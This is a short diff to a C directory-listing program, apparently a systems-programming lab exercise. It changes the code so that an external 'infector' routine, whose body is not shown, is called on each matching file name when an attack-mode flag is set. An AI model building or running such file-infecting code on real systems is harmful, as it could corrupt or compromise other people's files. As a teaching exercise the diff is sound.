@@ -18,7 +18,7 @@
 
 
 extern int system_call();
-extern void infector();
+extern void infector(char *);
 typedef struct ent
 {
     int inode;    /* Inode number */
@@ -112,7 +112,10 @@ int main(int argc, char *argv[])
         }
         if (!pmode || (pmode && !strncmp(ptr->name, prefix, 1)))
         {   
-            infector(ptr->name);
+            if (amode){
+                system_call(SYS_WRITE , STDOUT ,"write\n" , 7);
+                infector(ptr->name);
+            }
             system_call(SYS_WRITE, STDOUT, ptr->name, strlen(ptr->name) + 2);
             system_call(SYS_WRITE, STDOUT, "\t\t", 3);
             if (pmode)
